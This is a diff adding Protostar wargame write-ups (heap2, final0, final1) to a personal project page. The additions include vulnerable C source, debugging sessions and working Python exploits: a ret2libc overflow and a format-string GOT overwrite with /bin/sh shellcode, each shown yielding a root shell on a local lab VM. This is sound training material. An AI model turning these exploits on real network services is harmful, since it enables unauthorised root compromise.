@@ -3,7 +3,7 @@ layout: project_single
 title:  "Protostar"
 slug: "protostar"
 ---
-protostar writeups
+#protostar writeups
 
 NOTE: write ups in progress!
 
@@ -24,10 +24,12 @@ NOTE: write ups in progress!
 |[Format2](#format2)|
 |[heap0](#heap0)|
 |[heap1](#heap1)|
+|[heap2](#heap2)|
 |[net0](#net0)|
 |[net1](#net1)|
 |[net2](#net2)|
-
+|[final0](#final0)|
+|[final1](#final1)|
 
 # Stack0
 
@@ -1722,3 +1724,497 @@ Now we just have to figure out how we want to use this. We can overwrite the i2.
 run $(python -c "print 'a'*20+'\x9c\xd0\xff\xff'") $(python -c "print '\x94\x84\x04\x08'")
 ```
 
+## Heap2
+
+### Source Code:
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+struct auth {     //define struct auth
+  char name[32];
+  int auth;
+};
+
+struct auth *auth; //pointer to struct
+char *service;      //pointer to char
+
+int main(int argc, char **argv)
+{
+  char line[128];   //our buffer
+
+  while(1) {  //infinite loop
+      printf("[ auth = %p, service = %p ]\n", auth, service);
+
+      if(fgets(line, sizeof(line), stdin) == NULL) break; //fgets to our buffer from stdin
+      
+      if(strncmp(line, "auth ", 5) == 0) {    //if input = auth
+          auth = malloc(sizeof(auth));        //allocate memory for struct auth (based on size of pointer auth!)
+          memset(auth, 0, sizeof(auth));      //zero out
+          if(strlen(line + 5) < 31) {         // check size of input after auth is <31
+              strcpy(auth->name, line + 5);   // if so, copy to name field of auth struct (32 bytes)
+          }
+      }
+      if(strncmp(line, "reset", 5) == 0) {  // if you enter reset, free auth
+          free(auth);
+      }
+      if(strncmp(line, "service", 6) == 0) {  //strdups input into auth->name
+          service = strdup(line + 7);
+      }
+      if(strncmp(line, "login", 5) == 0) {   //if you enter login
+          if(auth->auth) {                   //check auth field of struct is set
+              printf("you have logged in already!\n");
+          } else {
+              printf("please enter your password\n");
+          }
+      }
+  }
+}
+```
+
+### Walkthrough:
+For this one, we just need to set auth->auth to win. Luckily, the program only mallocs the size of the pointer, not the struct as required. You can see in the assembly, where it checks if auth is set
+
+```nasm
+8048a72:	8d 44 24 10          	lea    eax,[esp+0x10]
+ 8048a76:	89 04 24             	mov    DWORD PTR [esp],eax
+ 8048a79:	e8 ce fd ff ff       	call   804884c <strncmp@plt>
+ 8048a7e:	85 c0                	test   eax,eax
+ 8048a80:	0f 85 bc fe ff ff    	jne    8048942 <main+0xe>
+ 8048a86:	a1 f4 b5 04 08       	mov    eax,ds:0x804b5f4
+ 8048a8b:	8b 40 20             	mov    eax,DWORD PTR [eax+0x20] <---- 0x20 offset (or 32 decimal)
+ 8048a8e:	85 c0                	test   eax,eax
+ 8048a90:	74 11                	je     8048aa3 <main+0x16f>
+ 8048a92:	c7 04 24 a7 ad 04 08 	mov    DWORD PTR [esp],0x804ada7
+```
+We cant do a simple overflow because of the constraint of less than 31, but we can use the service feature to throw dat into our struct and overwrite the auth bit
+
+### winning command:
+
+```bash
+[ auth = (nil), service = (nil) ]
+auth xxxx
+[ auth = 0x95bb008, service = (nil) ]
+service aaaaaaaaaaaaaaaaaaaaaaaaaa
+[ auth = 0x95bb008, service = 0x95bb018 ]
+login
+you have logged in already!
+[ auth = 0x95bb008, service = 0x95bb018 ]
+
+```
+
+## final0 
+
+###Source Code:
+
+```c
+#include "../common/common.c"
+
+#define NAME "final0"
+#define UID 0
+#define GID 0
+#define PORT 2995
+
+/*
+ * Read the username in from the network
+ */
+
+char *get_username()
+{
+  char buffer[512];
+  char *q;
+  int i;
+
+  memset(buffer, 0, sizeof(buffer));
+  gets(buffer);
+
+  /* Strip off trailing new line characters */
+  q = strchr(buffer, '\n');
+  if(q) *q = 0;
+  q = strchr(buffer, '\r');
+  if(q) *q = 0;
+
+  /* Convert to lower case */
+  for(i = 0; i < strlen(buffer); i++) {
+      buffer[i] = toupper(buffer[i]);
+  }
+
+  /* Duplicate the string and return it */
+  return strdup(buffer);
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  username = get_username();
+  
+  printf("No such user %s\n", username);
+}
+```
+
+
+### Walkthrough:
+
+This challenge is a simple overflow, but this time, we need to debug a "remote" program. 
+So basically the trick to this, is we attach to the running process 
+
+```bash
+l$ sudo ps aux |grep final0  #sudo bc we had to start final0 as sudo
+root     21944  0.0  0.1   2060  1108 ?        Ss   14:19   0:00 /home/l/exploit-exercises/protostar/binaries/final0
+
+l@ip-172-31-61-60:~$ sudo gdb -p 21944
+Attaching to process 21944
+Reading symbols from /home/l/exploit-exercises/protostar/binaries/final0...done.
+Reading symbols from /lib32/libc.so.6...(no debugging symbols found)...done.
+Reading symbols from /lib/ld-linux.so.2...(no debugging symbols found)...done.
+0xf7fd8be9 in __kernel_vsyscall ()
+gdb$ 
+```
+Now, if we try to send some data with netcat or python, we'll run into some issues. GDB is attached to the parent process which is currently a systemcall that provides our socket. When data is sent to the port, it will spawn a child process of our target binary and we need to debug that. We need to set a few things in gdb to make this work!
+
+```bash
+set follow-fork-mode child  #when the program spawns a child process, GDB will follow that
+set detach-on-fork off      #stay attached to both processes when we fork
+```
+Now that we have set this up, we can use python to send some data and see useful data in gdb. I decided to just do a ret2libc rop for this challenge to get a shell. (if you need to know how this is done, check out [Stack6](#stack6) ;)
+Check out the python exploit below---
+
+### Python exploit:
+
+```python
+#! /usr/bin/python
+import socket
+import struct
+import telnetlib
+
+sys_loc = 0xf7e48940  #found with gdb print system
+bin_loc = 0xf7f66e8b  #found with find systemloc,+999999999, "/bin/sh"
+try:
+    print("[*]Connecting to target")
+    #create socket obj
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #connect the client
+    client.connect ( ('127.0.0.1',2995))
+
+    #payload
+    p =  'a'*532   #our offset 
+    p += struct.pack('<I', sys_loc)    
+    p += 'bbbb' #fake ebp
+    p += struct.pack('<I', bin_loc)
+    p += '\n'
+    print("[*]Sending Payload")
+    client.send(p)
+    print("enjoy your shell ;)")
+    #interact w shell
+    t = telnetlib.Telnet()
+    t.sock = client
+    t.interact()
+except socket.errno:
+    raise
+
+```
+### Winning command
+
+```bash
+l$ ./final0.py
+[*]Connecting to target
+[*]Sending Payload
+enjoy your shell ;)
+whoami
+root
+```
+
+## Final1
+
+
+### Source Code:
+
+```c
+#include "../common/common.c"
+
+#include <syslog.h>
+
+#define NAME "final1"
+#define UID 0
+#define GID 0
+#define PORT 2994
+
+char username[128];
+char hostname[64];
+
+void logit(char *pw)
+{
+  char buf[512];
+
+  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);
+
+  syslog(LOG_USER|LOG_DEBUG, buf);
+}
+
+void trim(char *str)
+{
+  char *q;
+
+  q = strchr(str, '\r');
+  if(q) *q = 0;
+  q = strchr(str, '\n');
+  if(q) *q = 0;
+}
+
+void parser()
+{
+  char line[128];
+
+  printf("[final1] $ ");
+
+  while(fgets(line, sizeof(line)-1, stdin)) {
+      trim(line);
+      if(strncmp(line, "username ", 9) == 0) {
+          strcpy(username, line+9);
+      } else if(strncmp(line, "login ", 6) == 0) {
+          if(username[0] == 0) {
+              printf("invalid protocol\n");
+          } else {
+              logit(line + 6);
+              printf("login failed\n");
+          }
+      }
+      printf("[final1] $ ");
+  }
+}
+
+void getipport()
+{
+  int l;
+  struct sockaddr_in sin;
+
+  l = sizeof(struct sockaddr_in);
+  if(getpeername(0, &sin, &l) == -1) {
+      err(1, "you don't exist");
+  }
+
+  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
+}
+
+int main(int argc, char **argv, char **envp)
+{
+  int fd;
+  char *username;
+
+  /* Run the process as a daemon */
+  background_process(NAME, UID, GID); 
+  
+  /* Wait for socket activity and return */
+  fd = serve_forever(PORT);
+
+  /* Set the client socket to STDIN, STDOUT, and STDERR */
+  set_io(fd);
+
+  getipport();
+  parser();
+
+}
+```
+
+### Walkthrough:
+
+So this exercise is a "remote blind format string". Looking at the source, it's not apparent that there is any format string vuln.  I started by sending some input to see what the program does.  If you give the input "username x" , it sets the username var to "x". Then when you do "login x" , it calls the logit function, which does an snprintf call, and a syslog call. 
+
+before proceeding, if you are new to format string vulns , http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html is a GREAT resource and helped me alot! Please read and understand before continuing!
+
+I started by throwing some input to test for format string vulns.
+
+```zsh
+➜  binaries git:(master) ✗ nc localhost 2994  ##connect to socket with netcat
+[final1] $ username %n%n%n         # give input to test for format string
+[final1] $ login %n%n%n
+```
+I simultaneously ran an ltrace on the process to see what was being called
+
+```zsh
+➜  ~ ps aux | grep final1  #find process
+l         9247  0.0  0.8  54552  8544 pts/2    S+   12:19   0:01 vim final1.py
+root     10460  0.0  0.1   2060  1184 ?        S    16:12   0:00 ./final1
+l        10467  0.0  0.0  14620   932 pts/1    S+   16:13   0:00 grep --color=auto --exclude-dir=.bzr --exclude-dir=CVS --exclude-dir=.git --exclude-dir=.hg --exclude-dir=.svn final1
+root     27488  0.0  0.1   2060  1196 ?        Ss   Jan27   0:00 ./final1
+➜  ~ sudo ltrace -p 10460
+[sudo] password for l: 
+strchr("login %n%n%n\n", '\r')                                   = nil
+strchr("login %n%n%n\n", '\n')                                   = "\n"
+strncmp("login %n%n%n", "username ", 9)                          = -1
+strncmp("login %n%n%n", "login ", 6)                             = 0
+snprintf("Login from 127.0.0.1:56412 as [%"..., 512, "Login from %s as [%s] with passw"..., "127.0.0.1:56412", "%n%n%n", "%n%n%n") = 62
+syslog(15, "Login from 127.0.0.1:56412 as [%"..., 0x8049ee4, 0x804a2a0, 0x804a220, 0xffffd6e6, 0, 0 <no return ...>
+--- SIGSEGV (Segmentation fault) ---
++++ killed by SIGSEGV +++
+➜  ~ 
+```
+
+We can see that its dying on the syslog call... So I pulled up GDB to take a closer look. I once again simultaneously fed the input from before with netcat while watching in GDB. 
+
+```bash
+Program received signal SIGSEGV, Segmentation fault.
+0x555d4e2f in vfprintf () from /lib32/libc.so.6
+gdb$ bt
+#0  0x555d4e2f in vfprintf () from /lib32/libc.so.6
+#1  0x55671aaf in __vsyslog_chk () from /lib32/libc.so.6
+#2  0x55671b87 in syslog () from /lib32/libc.so.6
+#3  0x080498ef in logit (pw=0xffffd6e6 "%n%n%n") at final1/final1.c:19
+#4  0x080499ef in parser () at final1/final1.c:46
+#5  0x08049b04 in main (argc=0x1, argv=0xffffd834, envp=0xffffd83c) at final1/final1.c:82
+gdb$ 
+```
+
+We can see the segfault happened in vfprintf. 
+
+Syslog calls vsyslog_chk which then calls vfprintf.
+
+So now we know where our printf vuln is. The next step is to check out the call stack at the vfprintf call by setting a breakpoint there.
+
+Syslog is also writing to /var/log/syslog, so we can use this to help us build our format string attack.
+
+we give the following input with netcat
+```bash
+[final1] $ username AAAAAA %p %p %p %p %p %p %p %p
+[final1] $ login AAAAAA %p %p %p %p %p %p %p %p
+login failed
+```
+and get the following output in our syslog
+
+```bash
+Jan 27 12:42:04 ip-172-31-61-60 final1: 
+Login from 127.0.0.1:56052 as [AAAAAA 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e] 
+with password [AAAAAA 0x31206d6f 0x302e3732 0x312e302e 0x3036353a 0x61203235 0x415b2073 0x41414141 0x70252041]
+```
+
+We can do some testing with this to calculate our offsets.  
+
+Here is our netcat input
+
+```bash
+➜  binaries git:(master) ✗ nc localhost 2994
+[final1] $ username x
+[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login AAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login AAAABBBBX %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p      login failed
+[final1] $ login xAAAABBBB %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
+login failed
+[final1] $ login xxxAAAABBBB%19$     
+login failed
+[final1] $ login xxxAAAABBBB%19$p
+login failed
+[final1] $ login xxxAAAABBBB%20$p
+login failed
+[final1] $ login xxxAAAABBBB%21$p
+login failed
+[final1] $ 
+```
+
+And corresponding syslog output
+
+```bash
+Feb  2 16:32:04 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732]
+Feb  2 16:32:43 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
+Feb  2 16:33:36 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [AAAABBBBX 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141415b 0x42424241]
+Feb  2 16:34:08 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xAAAABBBB 0x8049ee4 0x804a2a0 0x804a220 0xffffd6e6 (nil) (nil) 0x69676f4c 0x7266206e 0x31206d6f 0x302e3732 0x312e302e 0x3436353a 0x61203831 0x785b2073 0x6977205d 0x70206874 0x77737361 0x2064726f 0x4141785b 0x42424141]
+Feb  2 16:35:34 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB%]
+Feb  2 16:35:47 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x7878785b]
+Feb  2 16:36:02 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x41414141]
+Feb  2 16:36:28 ip-172-31-61-60 final1: Login from 127.0.0.1:56418 as [x] with password [xxxAAAABBBB0x42424242]  
+```
+The goal here is to use %x$p to point to the location on the stack that we can control. As you can see in the end, we get this with 20 and 21 given our input.
+
+Now that we have this, we can switch %p to %n to write arbitrary data to a target location.
+
+For this challenge, i wanted to try something new, so I overwrote the GOT (global offset table) entry for strcpy. This is the portion of our program that points us to the strcpy function in the loaded library. 
+
+```nasm
+08048cbc <strcpy@plt>:
+ 8048cbc:	ff 25 70 a1 04 08    	jmp    *0x804a170    <---- see the jump?
+ 8048cc2:	68 f0 00 00 00       	push   $0xf0
+ 8048cc7:	e9 00 fe ff ff       	jmp    8048acc <_init+0x30>
+```
+
+As you can see this jumps to the location at 0x804a170
+We will overwrite this with a location of some shellcode. Since we're going to jump to a location on the stack, make sure ASLR is off!
+
+We need to build an input that looks like this 
+```xml
+  <address><address+2>%<x>x%<offset>$hn%<y>x%<offset+1>$hn
+```
+we need to split the address up and do 2 writes, with %hn . We have our offsets from earlier testing. The tricky part now was getting the x and y values which will determine what is written to those locations by %n by providing a "bytes written" value. The method on codearcana didnt work out for me on this challenge, probably because there is the "Login from 127.0.0.1:56418 as [x] with password" , so I basically threw in a number for y and saw what was written to address+2. I then calced the dif, and modified the value accordingly until i got what i needed! Theres probably a more "scientific" method to go about this, but I was ready to get this done ;)
+
+After some testing , I ended up with the following values for my system. I could then throw shellcode on the end and jump to where it sat on the stack, and was able to get a shell!
+
+### Python exploit:
+
+```python 
+#! /usr/bin/python
+import socket
+import struct
+import telnetlib
+
+try:
+    print("[*]Connecting to target")
+    #create socket obj
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    #connect the client
+    client.connect ( ('127.0.0.1',2994))
+    target= 0x804a170
+    client.send("username i\n")
+    p = "login ###" 
+    p += struct.pack('<I', target) #target loc
+    p += struct.pack('<I', target+2)
+    p+= "%54992"  #val to write 0xd70c
+    p +="x%20$hn" #offset to hit target loc on stack
+    p +="%10483"  #value to write 0xffff
+    p +="x%21$hn " #stack offset+1
+    p += "\x31\xc0\x50\x68\x2f\x2f\x73"  #some shellcode
+    p += "\x68\x68\x2f\x62\x69\x6e\x89"
+    p += "\xe3\x89\xc1\x89\xc2\xb0\x0b"
+    p += "\xcd\x80\x31\xc0\x40\xcd\x80"
+    p += '\n'
+    raw_input("Press Enter to send payload")
+    print("[*]Sending Payload ")
+    client.send(p)
+    client.send("username x\n") #this will make us hit strcpy, which now jumps to shellcode!
+    print("enjoy your shell")
+    #interact w shell
+   
+    t = telnetlib.Telnet()
+    t.sock = client
+ 
+    t.interact()
+except socket.errno:
+    raise
+```
+
+### winning command:
+
+```zsh
+➜  binaries git:(master) ✗ ./final1.py 
+[*]Connecting to target
+Press Enter to send payload
+[*]Sending Payload 
+enjoy your shell
+[final1] $ [final1] $ login failed
+[final1] $ whoami
+root
+```
